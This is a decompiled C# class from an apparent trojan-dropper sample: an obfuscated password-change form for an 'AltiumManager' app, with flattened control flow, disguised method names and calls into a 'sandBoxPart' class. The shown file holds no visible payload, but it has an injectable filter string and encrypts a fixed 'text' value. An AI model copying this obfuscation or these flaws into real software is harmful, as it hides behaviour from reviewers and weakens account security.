// Decompiled with JetBrains decompiler
// Type: AltiumManager.changePassCtrl
// Assembly: LeOcHwILpefYMF8, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A7C159C0-2645-0515-18CC-33AA0158F2C6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Dropper.MSIL.Dapato.gen-949b68beab7b82f9c18962df03d52a02a963263103606c758f668476868a1381.exe

using AltiumManager.AltiumDatabaseDataSetTableAdapters;
using AltiumManager.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace AltiumManager
{
  [DesignerGenerated]
  public class changePassCtrl : UserControl
  {
    private IContainer components;
    private activeUserClass pUserObj;

    public changePassCtrl() => this.\uF114\uE53B\uF79C\uF184\uF64D\uE637\uE82D\uE363\uE1EE\uE633\uE451\uE0F8();

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (((!disposing ? 1 : 0) != 0 || this.components == null ? 1 : 0) != 0)
          return;
label_6:
        int num1 = 8;
        int num2 = 5;
        while (true)
        {
          switch (num2 ^ 104)
          {
            case 106:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (changePassCtrl.set_AltiumDatabaseDataSet);
              num2 = 2;
              continue;
            case 107:
              goto label_6;
            case 108:
              switch (num1)
              {
                case 106:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (changePassCtrl.get_Label2);
                  num1 = 9;
                  goto label_2;
                case 107:
                  this.components.Dispose();
                  num1 = 15;
                  goto label_2;
                case 108:
                  num1 = 14;
                  goto label_2;
                case 109:
                  goto label_12;
                default:
                  num2 = 3;
                  continue;
              }
            case 109:
label_2:
              num1 ^= 99;
              break;
          }
          num2 = 4;
        }
label_12:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \uF114\uE53B\uF79C\uF184\uF64D\uE637\uE82D\uE363\uE1EE\uE633\uE451\uE0F8()
    {
label_2:
      int num1 = sandBoxPart.\uEB44\uF432\uF881\uF8EC\uE0C2\uE511\uEEC6\uE36D\uF8FE\uEE87\uEB15\uE281(97);
label_1:
      while (true)
      {
        num1 ^= 101;
        switch (num1 + 99)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (changePassCtrl.get_UsersTableAdapter);
            num1 = -8;
            continue;
          case 1:
            goto label_5;
          case 2:
            this.AltiumDatabaseDataSet.BeginInit();
            ((ISupportInitialize) this.UsersBindingSource).BeginInit();
            this.SuspendLayout();
            num1 = -58;
            continue;
          case 3:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.Controls.Add((Control) this.changeBtn);
            num1 = -53;
            continue;
          case 4:
            this.Controls.Add((Control) this.Label1);
            this.Name = nameof (changePassCtrl);
            this.Size = new Size(265, 89);
            num1 = sandBoxPart.\uEB44\uF432\uF881\uF8EC\uE0C2\uE511\uEEC6\uE36D\uF8FE\uEE87\uEB15\uE281(105);
            continue;
          case 5:
            this.newPassTxt.Name = "newPassTxt";
            this.newPassTxt.Size = new Size(135, 20);
            this.newPassTxt.TabIndex = 3;
            num1 = -64;
            continue;
          case 6:
            this.Label1.AutoSize = true;
            this.Label1.Location = new Point(14, 9);
            this.Label1.Name = "Label1";
            num1 = -50;
            continue;
          case 7:
            this.Label2.AutoSize = true;
            this.Label2.Location = new Point(26, 34);
            this.Label2.Name = "Label2";
            num1 = -43;
            continue;
          case 8:
            this.newPassTxt.UseSystemPasswordChar = true;
            this.changeBtn.Location = new Point(97, 57);
            this.changeBtn.Name = "changeBtn";
            num1 = -62;
            continue;
          case 9:
            this.TableAdapterManager.BackupDataSetBeforeUpdate = false;
            this.TableAdapterManager.UpdateOrder = TableAdapterManager.UpdateOrderOption.InsertUpdateDelete;
            this.TableAdapterManager.UsersTableAdapter = this.UsersTableAdapter;
            num1 = -59;
            continue;
          case 10:
            this.changeBtn.Size = new Size(75, 23);
            this.changeBtn.TabIndex = 4;
            this.changeBtn.Text = "Change";
            num1 = -49;
            continue;
          case 11:
            this.components = (IContainer) new System.ComponentModel.Container();
            this.Label1 = new Label();
            this.Label2 = new Label();
            this.currPassTxt = new TextBox();
            num1 = -52;
            continue;
          case 12:
            this.newPassTxt = new TextBox();
            this.changeBtn = new Button();
            this.AltiumDatabaseDataSet = new AltiumDatabaseDataSet();
            num1 = -44;
            continue;
          case 13:
            this.changeBtn.UseVisualStyleBackColor = true;
            this.AltiumDatabaseDataSet.DataSetName = "AltiumDatabaseDataSet";
            this.AltiumDatabaseDataSet.SchemaSerializationMode = SchemaSerializationMode.IncludeSchema;
            num1 = -55;
            continue;
          case 14:
            this.Label1.Size = new Size(93, 13);
            this.Label1.TabIndex = 0;
            this.Label1.Text = "Current Password:";
            num1 = -63;
            continue;
          case 15:
            this.UsersBindingSource.DataMember = "Users";
            this.UsersBindingSource.DataSource = (object) this.AltiumDatabaseDataSet;
            this.UsersTableAdapter.ClearBeforeFill = true;
            num1 = -61;
            continue;
          case 16:
            this.currPassTxt.TabIndex = 2;
            this.currPassTxt.UseSystemPasswordChar = true;
            this.newPassTxt.Location = new Point(113, 31);
            num1 = -57;
            continue;
          case 17:
            this.Controls.Add((Control) this.newPassTxt);
            this.Controls.Add((Control) this.currPassTxt);
            this.Controls.Add((Control) this.Label2);
            num1 = -60;
            continue;
          case 18:
            this.AltiumDatabaseDataSet.EndInit();
            ((ISupportInitialize) this.UsersBindingSource).EndInit();
            this.ResumeLayout(false);
            num1 = -41;
            continue;
          case 19:
            this.Label2.Size = new Size(81, 13);
            this.Label2.TabIndex = 1;
            this.Label2.Text = "New Password:";
            num1 = -5;
            continue;
          case 20:
            this.UsersBindingSource = new BindingSource(this.components);
            this.UsersTableAdapter = new UsersTableAdapter();
            this.TableAdapterManager = new TableAdapterManager();
            num1 = -6;
            continue;
          case 21:
            goto label_32;
          default:
            goto label_2;
        }
      }
label_5:
      int num2 = AltiumDatabaseDataSet.\uF5B4\uEBB6\uED16\uE0FF\uE59B\uF026\uEFAB\uE051\uE189\uE10C\uF7F9\uF6D6(69);
      while (true)
      {
        switch ((num2 ^ 99) + 105)
        {
          case 0:
            num2 = -5;
            continue;
          case 1:
            this.currPassTxt.Name = "currPassTxt";
            num2 = -7;
            continue;
          case 2:
            num1 = -56;
            num2 = -3;
            continue;
          case 3:
            num2 = -8;
            continue;
          case 4:
            this.currPassTxt.Size = new Size(135, 20);
            num2 = AltiumDatabaseDataSet.ReleasedComponentsRowChangeEvent.\uE4B1\uE099\uEB2D\uF713\uEFE2\uE494\uE2B4\uEB29\uE7EC\uF1B8\uE270\uF6F8(63);
            continue;
          case 5:
            this.currPassTxt.Location = new Point(113, 6);
            num2 = -12;
            continue;
          case 6:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (changePassCtrl.get_Label2);
            num2 = -2;
            continue;
          case 7:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_32:
      this.PerformLayout();
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label2")]
    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("currPassTxt")]
    internal virtual TextBox currPassTxt { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("newPassTxt")]
    internal virtual TextBox newPassTxt { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button changeBtn
    {
      get => this._changeBtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uF114\uE53B\uF79C\uF184\uF64D\uE637\uE82D\uE363\uE1EE\uE633\uE451\uE0F9);
        Button changeBtn1 = this._changeBtn;
        if ((changeBtn1 == null ? 1 : 0) == 0)
          changeBtn1.Click -= eventHandler;
        this._changeBtn = value;
        Button changeBtn2 = this._changeBtn;
        if ((changeBtn2 == null ? 1 : 0) != 0)
          return;
        changeBtn2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("AltiumDatabaseDataSet")]
    internal virtual AltiumDatabaseDataSet AltiumDatabaseDataSet { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("UsersBindingSource")]
    internal virtual BindingSource UsersBindingSource { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("UsersTableAdapter")]
    internal virtual UsersTableAdapter UsersTableAdapter { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TableAdapterManager")]
    internal virtual TableAdapterManager TableAdapterManager { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    private void \uF114\uE53B\uF79C\uF184\uF64D\uE637\uE82D\uE363\uE1EE\uE633\uE451\uE0F9(
      object _param1,
      EventArgs _param2)
    {
label_2:
      int num1 = 3;
      loginClass loginClass;
      bool flag;
      while (true)
      {
        switch (num1 ^ 106)
        {
          case 105:
            loginClass = new loginClass();
            num1 = 0;
            continue;
          case 106:
            loginClass.userName = this.pUserObj.userName;
            num1 = 4;
            continue;
          case 107:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (changePassCtrl.get_TableAdapterManager);
            num1 = 1;
            continue;
          case 108:
            flag = Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.currPassTxt.Text, "", false) == 0 | Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.newPassTxt.Text, "", false) == 0;
            num1 = 7;
            continue;
          case 109:
            if (flag)
            {
              num1 = 5;
              continue;
            }
            goto label_11;
          case 110:
            num1 = 6;
            continue;
          case 111:
            goto label_10;
          default:
            goto label_2;
        }
      }
label_10:
      int num2 = 0;
      goto label_12;
label_11:
      num2 = 1;
label_12:
      if (num2 == 0)
      {
        int num3 = (int) Interaction.MsgBox((object) "Please fill out the boxes");
      }
      else
      {
        if ((loginClass.userAvailable(this.AltiumDatabaseDataSet.Users, this.UsersTableAdapter) ? 1 : 0) == 0)
        {
          AltiumDatabaseDataSet.UsersRow[] usersRowArray = (AltiumDatabaseDataSet.UsersRow[]) this.AltiumDatabaseDataSet.Users.Select("Username = '" + loginClass.userName + "'");
          string userPass = usersRowArray[0].UserPass;
          Simple3Des simple3Des1 = new Simple3Des(this.currPassTxt.Text);
          try
          {
            simple3Des1.decryptData(userPass);
label_18:
            int num4 = 15;
            Simple3Des simple3Des2;
            string str;
            while (true)
            {
              switch (num4 ^ 103)
              {
                case 103:
                  \uEF33\uF205\uE560\uF33F\uE7F1\uEFE2\uEF15\uE192\uE066\uF727\uF51A\uEAE7.\uE681\uF0E4\uF481\uF504\uE501\uF2E5\uE299\uE5CD\uE41E\uE684\uF872\uF3A0.\uE0A4\uF566\uEBFE\uE652\uF3D5\uF6E6\uE84B\uF36D\uE9EA\uE2D6\uE8A2\uF080.LogoutToolStripMenuItem.PerformClick();
                  num4 = 10;
                  continue;
                case 104:
                  simple3Des2 = new Simple3Des(this.newPassTxt.Text);
                  num4 = 13;
                  continue;
                case 105:
                  num4 = 12;
                  continue;
                case 106:
                  str = simple3Des2.encryptData("text");
                  num4 = 9;
                  continue;
                case 107:
                  this.UsersTableAdapter.Update(this.AltiumDatabaseDataSet.Users);
                  num4 = 8;
                  continue;
                case 108:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (changePassCtrl.set_changeBtn);
                  num4 = 11;
                  continue;
                case 109:
                  num4 = 23;
                  continue;
                case 110:
                  usersRowArray[0].UserPass = str;
                  num4 = 14;
                  continue;
                case 111:
                  int num5 = (int) Interaction.MsgBox((object) "Password has been changed. Logging out");
                  num4 = 0;
                  continue;
                case 112:
                  goto label_30;
                default:
                  goto label_18;
              }
            }
          }
          catch (CryptographicException ex)
          {
            ProjectData.SetProjectError((Exception) ex);
            int num6 = (int) Interaction.MsgBox((object) "Incorrect password");
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          int num7 = (int) Interaction.MsgBox((object) "User not found");
        }
label_30:;
      }
    }

    public void getActiveUser(activeUserClass tempUser) => this.pUserObj = tempUser;

    private void \uF114\uE53B\uF79C\uF184\uF64D\uE637\uE82D\uE363\uE1EE\uE633\uE451\uE0FA(
      object _param1,
      EventArgs _param2)
    {
label_7:
      int num1 = 54;
      int num2 = AltiumDatabaseDataSet.UsersDataTable.\uE23F\uE7C9\uEE0F\uE7EA\uED41\uE818\uECBF\uEA9A\uF708\uE0CF\uE6D6\uEB0D(108);
      while (true)
      {
        switch ((num2 ^ 93) + 104)
        {
          case 0:
            switch (num1)
            {
              case 103:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (changePassCtrl.get_currPassTxt);
                num1 = 56;
                goto label_1;
              case 104:
                num1 = 53;
                goto label_1;
              case 105:
                this.Validate();
                num1 = 52;
                goto label_1;
              case 106:
                this.TableAdapterManager.UpdateAll(this.AltiumDatabaseDataSet);
                num1 = 51;
                goto label_1;
              case 107:
                this.UsersBindingSource.EndEdit();
                num1 = 55;
                goto label_1;
              case 108:
                goto label_12;
              default:
                num2 = -57;
                continue;
            }
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (changePassCtrl.set_changeBtn);
            num2 = -60;
            continue;
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 95;
            break;
        }
        num2 = sandBoxPart.\uEB44\uF432\uF881\uF8EC\uE0C2\uE511\uEEC6\uE36D\uF8FE\uEE87\uEB15\uE281(102);
      }
label_12:;
    }
  }
}
